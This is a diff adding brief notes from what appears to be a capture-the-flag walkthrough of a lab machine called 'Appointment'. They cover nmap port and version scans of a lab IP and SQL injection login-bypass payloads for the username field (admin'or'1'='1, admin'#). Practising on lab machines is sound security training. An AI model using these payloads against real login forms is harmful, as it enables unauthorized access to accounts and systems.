@@ -1,0 +1,24 @@
+APPOINTMENT:
+----------------
+
+sql - sql-injection - tcp - 80 - http
+
+1- nmap:
+----------------
+sudo nmap -p- --open -sS -vvv --min-rate 5000 -vvv -n -Pn 10.129.111.129 -oG nmap.txt -> ports
+-
+nmap -sV 10.129.111.129 -> version 
+
+
+2- tcp-80:
+----------------
+	http://10.129.111.129
+	
+3- sql:
+----------------
+	comment -> #
+	
+4- sql injection:
+----------------
+	user :	admin'or'1'='1
+		admin'#
